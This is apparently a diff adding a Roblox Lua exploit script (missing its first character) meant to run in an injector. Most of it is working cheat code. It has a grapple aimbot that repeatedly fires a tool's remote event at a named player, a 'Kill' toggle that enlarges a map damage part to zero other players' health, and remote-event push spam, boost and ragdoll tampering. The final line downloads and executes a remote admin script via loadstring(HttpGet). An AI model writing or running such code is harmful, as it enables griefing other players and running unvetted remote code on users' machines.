@@ -1,0 +1,514 @@
+ocal ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local player = game.Players.LocalPlayer
+
+-- Persistent variables for GUI states and positions
+local isFiring1 = true -- Gui1 is always on initially
+local lastGuiPosition1 = UDim2.new(0, 10, 0, 10)
+local renderConnection1, renderConnection2
+
+-- Function to get the main rope
+local function getMainRope()
+    local ropesFolder = workspace:FindFirstChild("Ropes")
+    local userRopeFolder = ropesFolder and ropesFolder:FindFirstChild("7unlv3d")
+    return userRopeFolder and userRopeFolder:FindFirstChild("mainConnectionRope")
+end
+
+-- Function to set rope length
+local function setRopeLength(length)
+    local mainRope = getMainRope()
+    if mainRope then
+        mainRope.Length = length
+    end
+end
+
+-- Function to create the first GUI with combined logic
+local function createGui1()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "MyGUI1"
+    gui.ResetOnSpawn = false
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local window = Instance.new("Frame")
+    window.Name = "MainWindow1"
+    window.Size = UDim2.new(0, 200, 0, 100)
+    window.Position = lastGuiPosition1
+    window.BackgroundColor3 = Color3.new(0, 0, 0) -- Changed to black
+    window.BackgroundTransparency = 0.5
+    window.Active = true
+    window.Draggable = true
+    window.Parent = gui
+
+    local toggleButton1 = Instance.new("TextButton")
+    toggleButton1.Name = "ToggleButton1"
+    toggleButton1.Size = UDim2.new(0, 150, 0, 75) -- Increased button size
+    toggleButton1.Position = UDim2.new(0.5, -75, 0.5, -37)
+    toggleButton1.BackgroundColor3 = Color3.new(0, 0, 0) -- Changed to black
+    toggleButton1.Text = isFiring1 and "On" or "Off"
+    toggleButton1.TextColor3 = Color3.new(1, 1, 1)
+    toggleButton1.Parent = window
+
+    -- Start and stop actions for length 5
+    local function startSettingLengthTo5()
+        isFiring1 = true
+        toggleButton1.Text = "On"
+        if renderConnection1 then
+            renderConnection1:Disconnect()
+        end
+        renderConnection1 = RunService.Heartbeat:Connect(function()
+            if not isFiring1 then return end
+            setRopeLength(5)
+        end)
+    end
+
+    local function stopSettingLengthTo5()
+        isFiring1 = false
+        toggleButton1.Text = "Off"
+        if renderConnection1 then
+            renderConnection1:Disconnect()
+            renderConnection1 = nil
+        end
+        setRopeLength(999999)
+    end
+
+    -- Start and stop actions for firing max length
+    local function startFiringMaxLength()
+        local fireCount = 100 -- Fire 100 times
+        if renderConnection2 then
+            renderConnection2:Disconnect()
+        end
+        renderConnection2 = RunService.Heartbeat:Connect(function()
+            if fireCount <= 0 then
+                if renderConnection2 then
+                    renderConnection2:Disconnect()
+                    renderConnection2 = nil
+                end
+                return
+            end
+            setRopeLength(999999)
+            fireCount -= 1
+        end)
+    end
+
+    local function stopFiringMaxLength()
+        if renderConnection2 then
+            renderConnection2:Disconnect()
+            renderConnection2 = nil
+        end
+        setRopeLength(999999)
+    end
+
+    -- Toggle button action for Gui1
+    toggleButton1.MouseButton1Click:Connect(function()
+        if isFiring1 then
+            stopSettingLengthTo5()
+            startFiringMaxLength()
+        else
+            stopFiringMaxLength()
+            startSettingLengthTo5()
+        end
+    end)
+
+    window:GetPropertyChangedSignal("Position"):Connect(function()
+        lastGuiPosition1 = window.Position
+    end)
+end
+
+-- Ensure GUI is created only once
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+createGui1()
+
+--
+local gui = Instance.new("ScreenGui")
+gui.Name = "GrappleScriptGUI"
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 160, 0, 120)
+frame.Position = UDim2.new(0.5, -80, 0.5, -60)
+frame.BackgroundTransparency = 0.5
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Parent = gui
+
+-- Add UIStroke to frame
+local frameStroke = Instance.new("UIStroke")
+frameStroke.Color = Color3.new(0, 0, 0)
+frameStroke.Thickness = 2
+frameStroke.Parent = frame
+
+local dragBar = Instance.new("Frame")
+dragBar.Size = UDim2.new(1, 0, 0, 50) -- Increased height to make it bigger
+dragBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+dragBar.Parent = frame
+
+-- Add UIStroke to dragBar
+local dragBarStroke = Instance.new("UIStroke")
+dragBarStroke.Color = Color3.new(0, 0, 0)
+dragBarStroke.Thickness = 2
+dragBarStroke.Parent = dragBar
+
+-- Grapple Script Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 140, 0, 30)
+button.Position = UDim2.new(0, 10, 0, 10)
+button.Text = "Grapple Script"
+button.TextColor3 = Color3.new(1, 1, 1)
+button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+button.Parent = frame
+
+-- Add UIStroke to button
+local buttonStroke = Instance.new("UIStroke")
+buttonStroke.Color = Color3.new(0, 0, 0)
+buttonStroke.Thickness = 2
+buttonStroke.Parent = button
+
+-- Player Name Input TextBox
+local playerNameBox = Instance.new("TextBox")
+playerNameBox.Size = UDim2.new(0, 140, 0, 30)
+playerNameBox.Position = UDim2.new(0, 10, 0, 60)
+playerNameBox.PlaceholderText = "Enter player name"
+playerNameBox.TextColor3 = Color3.new(1, 1, 1)
+playerNameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+playerNameBox.ClearTextOnFocus = true
+playerNameBox.Parent = frame
+
+-- Add UIStroke to playerNameBox
+local playerNameBoxStroke = Instance.new("UIStroke")
+playerNameBoxStroke.Color = Color3.new(0, 0, 0)
+playerNameBoxStroke.Thickness = 2
+playerNameBoxStroke.Parent = playerNameBox
+
+-- Grapple Button for targeting player
+local grappleButton = Instance.new("TextButton")
+grappleButton.Size = UDim2.new(0, 140, 0, 30)
+grappleButton.Position = UDim2.new(0, 10, 0, 100)
+grappleButton.Text = "Target Player"
+grappleButton.TextColor3 = Color3.new(1, 1, 1)
+grappleButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+grappleButton.Parent = frame
+
+-- Add UIStroke to grappleButton
+local grappleButtonStroke = Instance.new("UIStroke")
+grappleButtonStroke.Color = Color3.new(0, 0, 0)
+grappleButtonStroke.Thickness = 2
+grappleButtonStroke.Parent = grappleButton
+
+-- Variables
+local targetPlayer = nil
+local isEnabled = false
+local fireRate = 0.08
+
+-- Function to calculate movement prediction
+local function getPredictedPosition(torso)
+    local velocity = torso.AssemblyLinearVelocity
+    return torso.Position + (velocity * 0.4)
+end
+
+-- Function to check for grapple tool
+local function hasGrappleTool()
+    local character = game:GetService("Players").LocalPlayer.Character
+    if character then
+        for _, item in pairs(character:GetChildren()) do
+            if item:IsA("Tool") and item:FindFirstChild("RemoteEvent") then
+                return item
+            end
+        end
+    end
+    return nil
+end
+
+-- Function to fire the grapple
+local function fireGrappleInstantly()
+    if targetPlayer and targetPlayer.Character then
+        local rootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if rootPart then
+            local predictedPosition = getPredictedPosition(rootPart)
+
+            local grappleTool = hasGrappleTool()
+            if grappleTool then
+                local args = {
+                    [1] = predictedPosition
+                }
+                grappleTool.RemoteEvent:FireServer(unpack(args))
+                print("Grappled to " .. targetPlayer.Name)
+            else
+                print("Grapple tool not equipped!")
+            end
+        else
+            warn("Target player does not have HumanoidRootPart!")
+        end
+    else
+        warn("No valid target player!")
+    end
+end
+
+-- Grapple loop function
+local function grappleLoop()
+    while isEnabled do
+        fireGrappleInstantly()
+        task.wait(fireRate)
+    end
+end
+
+-- Utility function to find player by name
+local function findPlayerByName(name)
+    local players = game:GetService("Players"):GetPlayers()
+    name = name:lower()
+    for _, player in ipairs(players) do
+        if player.Name:lower():find(name) or player.DisplayName:lower():find(name) then
+            return player
+        end
+    end
+    return nil
+end
+
+-- Toggle grapple script
+local function toggleLoop()
+    local playerName = playerNameBox.Text:lower()
+    if playerName and playerName ~= "" then
+        targetPlayer = findPlayerByName(playerName)
+
+        if targetPlayer then
+            isEnabled = not isEnabled
+            if isEnabled then
+                button.Text = "Grapple Script: ON"
+                task.spawn(grappleLoop)
+            else
+                button.Text = "Grapple Script: OFF"
+            end
+        else
+            warn("Player not found! Double-check the name entered.")
+        end
+    else
+        warn("Please enter a valid player name!")
+    end
+end
+
+-- Button click events
+button.MouseButton1Click:Connect(toggleLoop)
+grappleButton.MouseButton1Click:Connect(fireGrappleInstantly)
+
+-- Draggable functionality for the GUI (Mobile Support)
+local dragging = false
+local dragInput, dragStart, startPos
+local UIS = game:GetService("UserInputService")
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+dragBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+dragBar.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        updateDrag(input)
+    end
+end)
+--
+
+local gui = Instance.new("ScreenGui")
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Name = "Grapple UI" -- Name updated
+gui.DisplayOrder = 999
+gui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)  -- Adjusted size for additional buttons
+frame.Position = UDim2.new(1, -220, 0, 10)
+frame.BackgroundTransparency = 0
+frame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black background
+frame.Parent = gui
+
+local yOffset = 26  -- Increased to make room for the drag bar
+local buttonHeight = 15
+local buttonSpacing = 5
+
+local function createToggleButton(text, toggleFunction)
+    local button = Instance.new("TextButton")
+    button.Text = text .. ": OFF"
+    button.Size = UDim2.new(0, 180, 0, buttonHeight)
+    button.Position = UDim2.new(0, 10, 0, yOffset)
+    button.BackgroundTransparency = 0
+    button.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black background for buttons
+    button.TextColor3 = Color3.new(1, 1, 1)  -- White text
+    button.Parent = frame
+
+    yOffset = yOffset + buttonHeight + buttonSpacing
+
+    local isEnabled = false
+
+    button.MouseButton1Click:Connect(function()
+        isEnabled = not isEnabled
+        button.Text = text .. ": " .. (isEnabled and "ON" or "OFF")
+        toggleFunction(isEnabled)
+    end)
+end
+
+-- Function to toggle "Kill" functionality
+createToggleButton("Kill", function(isEnabled)
+    local damagePart = workspace:FindFirstChild("Pit") and workspace.Pit:FindFirstChild("Damage")
+
+    if isEnabled then
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local root = character:WaitForChild("HumanoidRootPart")
+
+        if damagePart then
+            damagePart.CFrame = root.CFrame
+            damagePart.Size = Vector3.new(9999999, 9999999, 9999999)
+            damagePart.Touched:Connect(function(hit)
+                if hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
+                    hit.Parent.Humanoid.Health = 0
+                end
+            end)
+        else
+            warn("Damage part not found in workspace.Pit!")
+        end
+    else
+        if damagePart then
+            damagePart.Size = Vector3.new(10, 10, 10)
+            damagePart.Position = Vector3.new(0, -5000, 0)
+        end
+    end
+end)
+
+-- Toggle Touch functionality
+createToggleButton("Toggle Touch", function(isEnabled)
+    for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+        if v:IsA("BasePart") then
+            v.CanCollide = not isEnabled
+            v.CanTouch = not isEnabled
+        end
+    end
+end)
+
+-- Repeatedly fire "Push" remote event using Heartbeat
+local RunService = game:GetService("RunService")
+local pushConnection
+createToggleButton("Push", function(isEnabled)
+    if isEnabled then
+        pushConnection = RunService.Heartbeat:Connect(function()
+            local player = game.Players.LocalPlayer
+            if player.Character and player.Character:FindFirstChild("Push") then
+                game:GetService("ReplicatedStorage").Events.Remote.Client.push:FireServer()
+            end
+        end)
+    else
+        if pushConnection then
+            pushConnection:Disconnect()
+            pushConnection = nil
+        end
+    end
+end)
+
+-- Combine "Jump" and "Speed" teleport functionality into one button
+createToggleButton("Boost Teleport", function(isEnabled)
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local root = character:WaitForChild("HumanoidRootPart")
+
+    if isEnabled then
+        local jumpBoost = workspace:FindFirstChild("Map") and workspace.Map.Cool.Boosts:FindFirstChild("Jump")
+        local speedBoost = workspace:FindFirstChild("Map") and workspace.Map.Cool.Boosts:FindFirstChild("Speed")
+
+        if jumpBoost and jumpBoost:FindFirstChild("touchDetector") then
+            local jumpDetector = jumpBoost.touchDetector
+            jumpDetector.CFrame = root.CFrame
+            jumpDetector.Size = Vector3.new(400000000000000, 4000000000000000, 40000000000000)
+        else
+            warn("Jump boost not found!")
+        end
+
+        if speedBoost and speedBoost:FindFirstChild("touchDetector") then
+            local speedDetector = speedBoost.touchDetector
+            speedDetector.CFrame = root.CFrame
+            speedDetector.Size = Vector3.new(200000000000000, 200000000000000000, 2000000000000000000000)
+        else
+            warn("Speed boost not found!")
+        end
+    else
+        local jumpBoost = workspace:FindFirstChild("Map") and workspace.Map.Cool.Boosts:FindFirstChild("Jump")
+        local speedBoost = workspace:FindFirstChild("Map") and workspace.Map.Cool.Boosts:FindFirstChild("Speed")
+
+        if jumpBoost and jumpBoost:FindFirstChild("touchDetector") then
+            jumpBoost.touchDetector.Size = Vector3.new(1, 1, 1)
+        end
+        if speedBoost and speedBoost:FindFirstChild("touchDetector") then
+            speedBoost.touchDetector.Size = Vector3.new(1, 1, 1)
+        end
+    end
+end)
+
+-- Remove Ragdoll button
+createToggleButton("Remove Ragdoll", function(isEnabled)
+    if isEnabled then
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        
+        local ragdollValue = character:FindFirstChild("ragdollValue")
+        if ragdollValue then
+            ragdollValue:Destroy()
+            print("Ragdoll removed successfully.")
+        else
+            warn("No ragdollValue found in the character.")
+        end
+    end
+end)
+
+-- Draggable functionality for mobile (and desktop mouse) support
+local dragging, dragInput, dragStart, startPos
+
+-- Create the draggable bar (top part)
+local dragBar = Instance.new("Frame")
+dragBar.Size = UDim2.new(1, 0, 0, 20)
+dragBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+dragBar.Parent = frame
+
+dragBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
+end)
+
+dragBar.InputChanged:Connect(function(input)
+    if dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+dragBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+--
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-23304"))()
